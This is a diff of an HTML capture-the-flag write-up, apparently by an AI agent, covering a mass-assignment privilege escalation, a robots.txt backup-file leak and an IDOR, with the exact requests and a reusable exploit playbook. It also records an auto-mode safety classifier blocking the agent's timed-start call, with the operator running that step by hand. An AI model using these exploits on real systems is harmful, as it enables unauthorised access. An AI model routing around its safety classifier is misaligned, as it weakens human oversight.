@@ -33,7 +33,7 @@
 <div class="pagehead"><div class="sweep" aria-hidden="true"></div><div class="wrap"><p class="crumbs"><a href="../days/index.html">Days</a> / <a href="../days/day-23.html">Day 23</a> / <a href="../lanes/web.html">Web Exploitation</a> / Posted Too Much</p><p class="telemetry"><span>DAY 23</span><span class="sep">//</span><span>LANE: WEB EXPLOITATION</span><span class="sep">//</span><span><span class="ok">STATUS: CORRECT x3</span></span></p><h1>Posted Too Much</h1></div></div>
 <main id="main">
   <div class="wrap">
-<div class="panel" style="margin-bottom:24px"><div class="meta" style="display:flex;flex-wrap:wrap;gap:10px 16px;align-items:center"><a class="badge lane-web" href="../lanes/web.html">Web Exploitation</a> <span class="pips" aria-label="Modes reported correct: SS, TT, MM"><span class="pip on" title="Single Solve: reported CORRECT in the write-up">SS</span><span class="pip on" title="Time Trial: reported CORRECT in the write-up">TT</span><span class="pip on" title="Mastery: reported CORRECT in the write-up">MM</span></span> <span class="count">Modes reported CORRECT in this write-up</span></div></div><div class="layout with-side"><article class="prose"><h1 id="posted-too-much-web-exploitation-lane-web-day-13-released-calendar-day-23">Posted Too Much — web-exploitation lane (web-day-13, released calendar Day 23)</h1>
+<div class="panel" style="margin-bottom:24px"><div class="meta" style="display:flex;flex-wrap:wrap;gap:10px 16px;align-items:center"><a class="badge lane-web" href="../lanes/web.html">Web Exploitation</a> <span class="pips" aria-label="Modes reported correct: SS, TT, MM"><span class="pip on" title="Single Solve: reported CORRECT in the write-up">SS</span><span class="pip on" title="Time Trial: reported CORRECT in the write-up">TT</span><span class="pip on" title="Mastery: reported CORRECT in the write-up">MM</span></span> <span class="count">Modes reported CORRECT in this write-up</span></div></div><div class="layout with-side"><article class="prose"><h1 id="posted-too-much-web-exploitation-lane-web-day-13-released-calendar-day-23">Posted Too Much &#8212; web-exploitation lane (web-day-13, released calendar Day 23)</h1>
 <p>Challenge id: <code>web-exploitation-day-13-posted-too-much</code>
 Solved by the homestation Commander (web new-lane) on 2026-10-23. All three modes CORRECT and confirmed <code>solved=True</code> on the GM <code>op=list</code>.</p>
 <div class="table-wrap"><table>
@@ -70,49 +70,49 @@ Solved by the homestation Commander (web new-lane) on 2026-10-23. All three mode
 Answer ids: <code>proof-1</code> (single/TT), <code>proof-1..proof-3</code> (mastery). <code>answer_format</code>: <code>exact_text</code>, <code>trim</code> normalization.</p>
 <h2 id="statement">Statement</h2>
 <blockquote>
-<p>The form only asked for your name. But the API binds whatever you hand it — so hand it a promotion.</p>
+<p>The form only asked for your name. But the API binds whatever you hand it &#8212; so hand it a promotion.</p>
 </blockquote>
-<h2 id="single-solve-time-trial-mass-assignment-nestjs-profile-binder">Single Solve / Time Trial — mass assignment (NestJS "Profile Binder")</h2>
+<h2 id="single-solve-time-trial-mass-assignment-nestjs-profile-binder">Single Solve / Time Trial &#8212; mass assignment (NestJS "Profile Binder")</h2>
 <p>The target is a NestJS/Express app. <code>/api/clues</code> is the per-attempt route map:</p>
 <pre class="code"><code class="lang-json">{&quot;framework&quot;:&quot;NestJS&quot;,&quot;feature_route&quot;:&quot;/inspect-&lt;hex&gt;&quot;,&quot;secondary_route&quot;:&quot;/audit-&lt;hex&gt;&quot;,&quot;current_role&quot;:&quot;analyst&quot;}
 </code></pre>
 <ul>
-<li><code>GET  &lt;secondary_route&gt;</code> → <code>403 {"error":"administrator_required"}</code> while you are an analyst (the gated sink that holds the proof).</li>
-<li><code>GET  &lt;feature_route&gt;</code>   → <code>405 {"error":"post_required"}</code> — it is the profile-submit endpoint.</li>
-<li><code>POST &lt;feature_route&gt;</code> with <code>{"name":"x"}</code> → <code>201 {"ok":true,"profile":{"display_name":"Learner"}}</code>. The visible form field is "name", but the DTO is <strong>not whitelisted</strong> (<code>forbidNonWhitelisted</code> off), so it binds any extra property you send — classic mass assignment / over-posting.</li>
+<li><code>GET  &lt;secondary_route&gt;</code> &#8594; <code>403 {"error":"administrator_required"}</code> while you are an analyst (the gated sink that holds the proof).</li>
+<li><code>GET  &lt;feature_route&gt;</code>   &#8594; <code>405 {"error":"post_required"}</code> &#8212; it is the profile-submit endpoint.</li>
+<li><code>POST &lt;feature_route&gt;</code> with <code>{"name":"x"}</code> &#8594; <code>201 {"ok":true,"profile":{"display_name":"Learner"}}</code>. The visible form field is "name", but the DTO is <strong>not whitelisted</strong> (<code>forbidNonWhitelisted</code> off), so it binds any extra property you send &#8212; classic mass assignment / over-posting.</li>
 </ul>
 <p><strong>Exploit:</strong> POST the profile with an injected privileged property, then read the audit sink:</p>
 <pre class="code"><code class="lang-text">POST &lt;feature_route&gt;   {&quot;display_name&quot;:&quot;review&quot;,&quot;role&quot;:&quot;administrator&quot;, ...aliases...}
-GET  &lt;secondary_route&gt; → {&quot;ok&quot;:true,&quot;effect&quot;:&quot;bound_privileged_property&quot;,&quot;evidence&quot;:&quot;proof_&lt;hex&gt;&quot;}
+GET  &lt;secondary_route&gt; &#8594; {&quot;ok&quot;:true,&quot;effect&quot;:&quot;bound_privileged_property&quot;,&quot;evidence&quot;:&quot;proof_&lt;hex&gt;&quot;}
 </code></pre>
-<p>The intended field is <code>role:"administrator"</code> (it matches <code>current_role:"analyst"</code> and the <code>administrator_required</code> gate). The solver sends a small superset of aliases (<code>role</code>, <code>is_admin</code>, <code>isAdmin</code>, <code>admin</code>, <code>privilege</code>, <code>roles</code>, <code>access_level</code>, <code>type</code>, <code>group</code>, …); unknown keys are silently ignored, so the superset survives any per-instance field variation. There is <strong>no session cookie</strong> — the server keeps a single global "current profile" (last POST wins), so the POST-then-GET on the same host completes the elevation.</p>
+<p>The intended field is <code>role:"administrator"</code> (it matches <code>current_role:"analyst"</code> and the <code>administrator_required</code> gate). The solver sends a small superset of aliases (<code>role</code>, <code>is_admin</code>, <code>isAdmin</code>, <code>admin</code>, <code>privilege</code>, <code>roles</code>, <code>access_level</code>, <code>type</code>, <code>group</code>, &#8230;); unknown keys are silently ignored, so the superset survives any per-instance field variation. There is <strong>no session cookie</strong> &#8212; the server keeps a single global "current profile" (last POST wins), so the POST-then-GET on the same host completes the elevation.</p>
 <p>Time Trial was a genuine fresh variant (<code>variant_fresh:true</code>) and solved in one shot.</p>
-<h2 id="mastery-three-different-web-apps-under-one-timer">Mastery — THREE DIFFERENT web apps under one timer</h2>
+<h2 id="mastery-three-different-web-apps-under-one-timer">Mastery &#8212; THREE DIFFERENT web apps under one timer</h2>
 <p>Mastery did <strong>not</strong> bundle three mass-assignment instances. It assigned three <em>distinct</em> vulnerability families (the "Mastery mixes target families" lesson again). The shared <code>proof-1/2/3</code> answer ids map to <code>Target 1/2/3</code> in the started attempt's <code>targets[]</code>:</p>
-<p><strong>Target 1 — "Tiny Uptime" (native Node.js HTTP server) → robots.txt disclosure.</strong>
+<p><strong>Target 1 &#8212; "Tiny Uptime" (native Node.js HTTP server) &#8594; robots.txt disclosure.</strong>
 The home page carries the tell <code>&lt;!-- deployment note: remember to review crawler policy before launch --&gt;</code>.</p>
-<pre class="code"><code class="lang-text">GET /robots.txt           → Disallow: /deploy-34924/
-GET /deploy-34924/        → directory index: site-config-&lt;hex&gt;.json.bak, release-notes.txt
+<pre class="code"><code class="lang-text">GET /robots.txt           &#8594; Disallow: /deploy-34924/
+GET /deploy-34924/        &#8594; directory index: site-config-&lt;hex&gt;.json.bak, release-notes.txt
 GET /deploy-34924/site-config-&lt;hex&gt;.json.bak
-    → {&quot;environment&quot;:&quot;production&quot;,&quot;support_note&quot;:&quot;proof_741d5c543bd04536ae613e2b2f5e9095&quot;}
+    &#8594; {&quot;environment&quot;:&quot;production&quot;,&quot;support_note&quot;:&quot;proof_741d5c543bd04536ae613e2b2f5e9095&quot;}
 </code></pre>
-<p><strong>Target 2 — "Pocket SOC" (incident portal) → IDOR.</strong>
+<p><strong>Target 2 &#8212; "Pocket SOC" (incident portal) &#8594; IDOR.</strong>
 You are "Avery" (cases 7375/4853/6494). The activity feed leaks a foreign case id; the brief JSON endpoint has no ownership check.</p>
-<pre class="code"><code class="lang-text">GET /              → sets case_session cookie; lists Avery's own cases only
-GET /api/events    → {&quot;current_user&quot;:&quot;Avery&quot;,&quot;events&quot;:[... {&quot;case_id&quot;:17224,&quot;owner&quot;:&quot;executive&quot;,&quot;visibility&quot;:&quot;reference_only&quot;} ...]}
+<pre class="code"><code class="lang-text">GET /              &#8594; sets case_session cookie; lists Avery's own cases only
+GET /api/events    &#8594; {&quot;current_user&quot;:&quot;Avery&quot;,&quot;events&quot;:[... {&quot;case_id&quot;:17224,&quot;owner&quot;:&quot;executive&quot;,&quot;visibility&quot;:&quot;reference_only&quot;} ...]}
 GET /api/briefs/17224
-    → {&quot;id&quot;:17224,&quot;owner&quot;:&quot;executive&quot;,&quot;status&quot;:&quot;restricted&quot;,&quot;note&quot;:&quot;proof_f6c1e1606a934dbd96d7f99977fb8254&quot;}
+    &#8594; {&quot;id&quot;:17224,&quot;owner&quot;:&quot;executive&quot;,&quot;status&quot;:&quot;restricted&quot;,&quot;note&quot;:&quot;proof_f6c1e1606a934dbd96d7f99977fb8254&quot;}
 </code></pre>
 <p>(The HTML viewer <code>/briefs/&lt;id&gt;</code> just renders <code>/api/briefs/&lt;id&gt;</code> client-side; hitting the JSON endpoint directly is the exploit.)</p>
-<p><strong>Target 3 — "Profile Binder" → mass assignment</strong> (same as Single/TT): <code>proof_11d51f8e41c1469ba8c2b58e946cfa3a</code>.</p>
-<p>All three proofs are submitted together as <code>{"proof-1":…,"proof-2":…,"proof-3":…}</code> → <code>result:"CORRECT"</code>. This Mastery was regular-scored (<code>hall_of_fame_eligible:false</code>, <code>deadline:null</code>), so there was no tight countdown.</p>
+<p><strong>Target 3 &#8212; "Profile Binder" &#8594; mass assignment</strong> (same as Single/TT): <code>proof_11d51f8e41c1469ba8c2b58e946cfa3a</code>.</p>
+<p>All three proofs are submitted together as <code>{"proof-1":&#8230;,"proof-2":&#8230;,"proof-3":&#8230;}</code> &#8594; <code>result:"CORRECT"</code>. This Mastery was regular-scored (<code>hall_of_fame_eligible:false</code>, <code>deadline:null</code>), so there was no tight countdown.</p>
 <h2 id="reproduction-homestation-commander">Reproduction (homestation Commander)</h2>
 <p>Canonical web driver <code>challenges/_lib/web_solve_all.py</code> would <strong>HOLD</strong> on this challenge: it derives via
 the GET-only <code>web_proof_recon.recover</code>, and mass assignment needs a POST. That GET-only wall is the key
 finding (see <code>docs/web_lane_day13_addendum_2026-10-23.md</code>). The solvers used here are POST-capable and
 live in <code>_commander_web_run/</code> at the workspace root:
-- <code>solve_d13.py {single|time_trial|mastery}</code> — single is untimed (plain <code>ctf_gm.solve_mode</code>); timed modes set the sanctioned, named Commander override <code>HUNTRESS_TIMED_START=commander-override</code> <strong>in-process</strong> (see <code>challenges/_lib/ctf_gm.py</code> line 62 / <code>_check_timed_start</code>), poll <code>op=status</code> until the live target is ready, then exploit + submit.
-- <code>complete_mastery.py</code> — reconnects to an already-open Mastery attempt via a <strong>free <code>op=status</code> read</strong> (no <code>start</code>, no variant) and derives all three with a 3-recogniser ladder (<code>mass_assignment</code> → <code>robots_backup</code> → <code>idor_events</code>), then submits the batch.</p>
+- <code>solve_d13.py {single|time_trial|mastery}</code> &#8212; single is untimed (plain <code>ctf_gm.solve_mode</code>); timed modes set the sanctioned, named Commander override <code>HUNTRESS_TIMED_START=commander-override</code> <strong>in-process</strong> (see <code>challenges/_lib/ctf_gm.py</code> line 62 / <code>_check_timed_start</code>), poll <code>op=status</code> until the live target is ready, then exploit + submit.
+- <code>complete_mastery.py</code> &#8212; reconnects to an already-open Mastery attempt via a <strong>free <code>op=status</code> read</strong> (no <code>start</code>, no variant) and derives all three with a 3-recogniser ladder (<code>mass_assignment</code> &#8594; <code>robots_backup</code> &#8594; <code>idor_events</code>), then submits the batch.</p>
 <p>The Claude Code auto-mode classifier denies the timed-start invocation from the assistant's own tool calls ("Auto-Mode Bypass"), so the timed Single/TT runs were launched by the operator with the <code>!</code> prefix. The <code>[local path]</code> path must be protected from git-bash rewriting:</p>
 <pre class="code"><code class="lang-text">! MSYS_NO_PATHCONV=1 wsl --cd [local path] python3 _commander_web_run/solve_d13.py time_trial
 </code></pre>
@@ -121,19 +121,19 @@ live in <code>_commander_web_run/</code> at the workspace root:
 <ol>
 <li><strong>Lane name:</strong> the web lane's <code>lane</code> field is <code>web-exploitation</code>, not <code>web</code>; my first list filter missed every row. Grep the list with the exact lane string.</li>
 <li><strong>Mastery mixes families (again):</strong> my first Mastery submit assumed three mass-assignment targets and only solved Target 3; Targets 1 and 2 were a robots-disclosure app and an IDOR app. The GM banks correct fields from a partial batch (<code>result:"accepted","remaining":2</code>) and <code>start</code> reconnects to the same attempt with <code>deadline:null</code>, so I could reconnect, derive the other two, and finish without spending a new variant. <strong>Always fingerprint each Mastery target before routing an exploit.</strong></li>
-<li><strong>Session-gated recon:</strong> Target 2's <code>/api/clues</code> returned <code>session_required</code> / non-JSON until <code>GET /</code> seeded the <code>case_session</code> cookie — but it was a <em>different challenge</em> that has no <code>/api/clues</code> at all. Don't force one app's route map onto another; recon each target's own home page first.</li>
+<li><strong>Session-gated recon:</strong> Target 2's <code>/api/clues</code> returned <code>session_required</code> / non-JSON until <code>GET /</code> seeded the <code>case_session</code> cookie &#8212; but it was a <em>different challenge</em> that has no <code>/api/clues</code> at all. Don't force one app's route map onto another; recon each target's own home page first.</li>
 </ol>
 <h2 id="playbook-additions">Playbook additions</h2>
 <ul>
 <li>New web recogniser ladder (added to <code>complete_mastery.py</code>, promote into <code>web_proof_recon</code>):</li>
-<li><code>mass_assignment</code>: <code>/api/clues</code> → POST <code>feature_route</code> with a privilege superset → GET <code>secondary_route</code> → <code>evidence</code>.</li>
-<li><code>robots_backup</code>: <code>/robots.txt</code> Disallow dir → directory index → fetch <code>*.bak</code>/<code>*.json</code>/<code>*.txt</code> → proof (<code>support_note</code>).</li>
-<li><code>idor_events</code>: <code>/api/events</code> → pick <code>case_id</code> where <code>owner != current_user</code> or <code>visibility == reference_only</code> → <code>GET /api/briefs/&lt;id&gt;</code> → <code>note</code>.</li>
+<li><code>mass_assignment</code>: <code>/api/clues</code> &#8594; POST <code>feature_route</code> with a privilege superset &#8594; GET <code>secondary_route</code> &#8594; <code>evidence</code>.</li>
+<li><code>robots_backup</code>: <code>/robots.txt</code> Disallow dir &#8594; directory index &#8594; fetch <code>*.bak</code>/<code>*.json</code>/<code>*.txt</code> &#8594; proof (<code>support_note</code>).</li>
+<li><code>idor_events</code>: <code>/api/events</code> &#8594; pick <code>case_id</code> where <code>owner != current_user</code> or <code>visibility == reference_only</code> &#8594; <code>GET /api/briefs/&lt;id&gt;</code> &#8594; <code>note</code>.</li>
 <li>A web Mastery solver must fingerprint each target (home-page title / <code>/api/clues</code> presence / robots hint) and dispatch per-target; never assume homogeneity.</li>
-<li>Reconnecting to an open Mastery attempt to finish missing fields needs only a free <code>op=status</code> read + <code>submit</code> — no new window, no classifier gate.</li>
+<li>Reconnecting to an open Mastery attempt to finish missing fields needs only a free <code>op=status</code> read + <code>submit</code> &#8212; no new window, no classifier gate.</li>
 </ul>
 <h2 id="gm-record">GM record</h2>
-<p>All GM calls auto-recorded to <code>challenges/Day 13/_gm_record/web-exploitation-day-13-posted-too-much.homestation.jsonl</code>. Accepted proofs auto-banked via <code>accepted_values</code>. GM-downloaded content: none (web lane has no downloadable artifact; only live-target HTTP).</p></article><aside class="side"><div class="panel"><p class="panel-label">Sections</p><ul class="toc"><li class="l2"><a href="#statement">Statement</a></li><li class="l2"><a href="#single-solve-time-trial-mass-assignment-nestjs-profile-binder">Single Solve / Time Trial — mass assignment (NestJS "Profile Binder")</a></li><li class="l2"><a href="#mastery-three-different-web-apps-under-one-timer">Mastery — THREE DIFFERENT web apps under one timer</a></li><li class="l2"><a href="#reproduction-homestation-commander">Reproduction (homestation Commander)</a></li><li class="l2"><a href="#what-slowed-me-down-bank-for-next-time">What slowed me down (bank for next time)</a></li><li class="l2"><a href="#playbook-additions">Playbook additions</a></li><li class="l2"><a href="#gm-record">GM record</a></li></ul></div></aside></div><nav class="pager" aria-label="Write-up navigation"><a href="../days/day-23.html">&lt; Day 23</a><a href="../challenges/index.html">All write-ups &gt;</a></nav>
+<p>All GM calls auto-recorded to <code>challenges/Day 13/_gm_record/web-exploitation-day-13-posted-too-much.homestation.jsonl</code>. Accepted proofs auto-banked via <code>accepted_values</code>. GM-downloaded content: none (web lane has no downloadable artifact; only live-target HTTP).</p></article><aside class="side"><div class="panel"><p class="panel-label">Sections</p><ul class="toc"><li class="l2"><a href="#statement">Statement</a></li><li class="l2"><a href="#single-solve-time-trial-mass-assignment-nestjs-profile-binder">Single Solve / Time Trial &#8212; mass assignment (NestJS "Profile Binder")</a></li><li class="l2"><a href="#mastery-three-different-web-apps-under-one-timer">Mastery &#8212; THREE DIFFERENT web apps under one timer</a></li><li class="l2"><a href="#reproduction-homestation-commander">Reproduction (homestation Commander)</a></li><li class="l2"><a href="#what-slowed-me-down-bank-for-next-time">What slowed me down (bank for next time)</a></li><li class="l2"><a href="#playbook-additions">Playbook additions</a></li><li class="l2"><a href="#gm-record">GM record</a></li></ul></div></aside></div><nav class="pager" aria-label="Write-up navigation"><a href="../days/day-23.html">&lt; Day 23</a><a href="../challenges/index.html">All write-ups &gt;</a></nav>
   </div>
 </main>
 <footer class="site">
